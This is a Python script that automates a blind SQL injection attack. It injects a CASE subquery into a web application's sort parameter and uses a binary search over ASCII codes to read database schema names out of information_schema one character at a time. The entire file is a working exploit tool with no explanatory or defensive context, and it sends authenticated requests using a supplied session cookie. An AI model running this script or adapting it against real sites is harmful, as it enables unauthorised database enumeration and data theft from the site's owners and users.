import requests
import time

COOKIE = ""
MAX_WORD_LEN = 50
MAX_ROW_CNT = 10

dictionary = list(range(33, 127))


request_cnt = 0

def check_char(pos, row, char_num, operator):
    global request_cnt

    # SELECT ??? FROM ??? ORDER BY ASC, BRUTEFORCE_QUERY
    url = f"http://example.de/list=action:asc, (SELECT CASE WHEN ((SELECT ASCII(SUBSTRING(SCHEMA_NAME, {pos + 1}, 1)) FROM information_schema.schemata LIMIT 1 OFFSET {row}){operator}{char_num}) THEN 1 ELSE 1*(SELECT table_name FROM information_schema.tables)END)=1;"
    resp = requests.get(url, headers={ "Cookie": COOKIE }).text
    request_cnt += 1

    return "Keyword" in resp


def find_valid_word(dictionary):

    valid_word_list = []
    for row in range(MAX_ROW_CNT):

        valid_word = ""
        for pos in range(MAX_WORD_LEN):

            tmp_dictionary = dictionary.copy()
            max_trys = len(tmp_dictionary) // 2
            for i in range(max_trys):

                middle = (len(tmp_dictionary) - 1) // 2
                if check_char(pos, row, tmp_dictionary[middle], '>') and len(tmp_dictionary) > 1:
                    tmp_dictionary = tmp_dictionary[middle + 1:]
                elif check_char(pos, row, tmp_dictionary[middle], '='):
                    valid_word += chr(tmp_dictionary[middle])
                    break
                elif len(tmp_dictionary) > 1:
                    tmp_dictionary = tmp_dictionary[:middle]
                else:
                  break
                    
            if len(valid_word) != pos + 1:
                break

        if len(valid_word) > 0:
            valid_word_list.append(valid_word)
        else:
            break

    return valid_word_list


def main():
    t0 = time.time_ns()

    valid_word_list = find_valid_word(dictionary)

    t1 = time.time_ns()
    cmp_time = round((t1 - t0) / 1e9, 3)

    print(f"\n{'-' * 30}")
    for i in range(len(valid_word_list)):
        print(valid_word_list[i])
    print('-' * 30)
    print(f"\nfinished in {cmp_time}s with {request_cnt} requests\n")

if __name__ == "__main__":
    main()